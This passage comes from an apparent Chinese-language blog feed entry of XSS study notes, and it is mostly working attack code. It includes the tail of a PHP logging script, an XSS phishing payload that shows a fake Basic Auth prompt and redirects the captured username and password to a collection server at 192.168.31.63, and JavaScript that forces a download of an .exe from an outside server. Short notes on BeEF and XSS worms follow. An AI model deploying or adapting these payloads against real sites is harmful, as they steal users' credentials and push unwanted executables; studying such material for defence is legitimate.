die(&quot;Unable to open file!&quot;);</span><br><span class="line">fwrite($log, $txt);</span><br><span class="line">fclose($log);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="网络钓鱼攻击"><a class="markdownIt-Anchor" href="#网络钓鱼攻击"></a> 网络钓鱼攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;script src=&quot;http://192.168.31.63/authtest.php?id=RAMWD1&amp;info=age%2Cmonth&quot;&gt;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">#php</span><br><span class="line">&lt;?</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ((!isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) || (!isset($_SERVER[&apos;PHP_AUTH_PW&apos;]))) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    header(&apos;WWW-Authenticate: Basic realm=&quot;&apos;.addslashes(trim($_GET[&apos;info&apos;])).&apos;&quot;&apos;);</span><br><span class="line"></span><br><span class="line">    header(&apos;HTTP/1.0 401 Unauthorized&apos;);</span><br><span class="line"></span><br><span class="line">    echo &apos;Authorization Required.&apos;;</span><br><span class="line"></span><br><span class="line">    exit;</span><br><span class="line"></span><br><span class="line">&#125; else if ((isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) &amp;&amp; (isset($_SERVER[&apos;PHP_AUTH_PW&apos;])))&#123;</span><br><span class="line"></span><br><span class="line">header(&quot;Location: http://192.168.31.63/index.php?do=api&amp;id=&#123;$_GET[id]&#125;&amp;username=&#123;$_SERVER[PHP_AUTH_USER]&#125;&amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;&quot;); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/fish.jpg" alt="fish"><br><img src="/images/xssplatform.jpg" alt="xss"></p><h2 id="beef框架"><a class="markdownIt-Anchor" href="#beef框架"></a> Beef框架</h2><blockquote><p>BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.</p></blockquote><h2 id="xss蠕虫"><a class="markdownIt-Anchor" href="#xss蠕虫"></a> xss蠕虫</h2><blockquote><p>其实是CSRF和xss的结合。利用XHR，另找时间研究学习一下。</p></blockquote><h2 id="强制软件下载"><a class="markdownIt-Anchor" href="#强制软件下载"></a> 强制软件下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line">$(document).ready(function()</span><br><span class="line">&#123;</span><br><span class="line">    var server = &quot;http://server.com/&quot;; //服务器</span><br><span class="line">    var gate = &quot;/test/test.exe&quot;; //要下载的文件</span><br><span class="line">    var tabURL = window.location.href;</span><br><span class="line"></span><br><span class="line">    var link = document.createElement(&apos;a&apos;);</span><br><span class="line">    link.href = server+gate;</span><br><span class="line">    link.download = &apos;&apos;;</span><br><span class="line">    document.body.appendChild(link);</span><br><span class="line">    link.click();    </span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念&quot;&gt;&lt;/a&gt; 概念&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;xss 全称为 cross site scripting. 特指攻击者利用网站对于用户输入过滤不足的缺陷，输入可以对用
      
    
    </summary>
    
      <category term="web_security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
</feed>
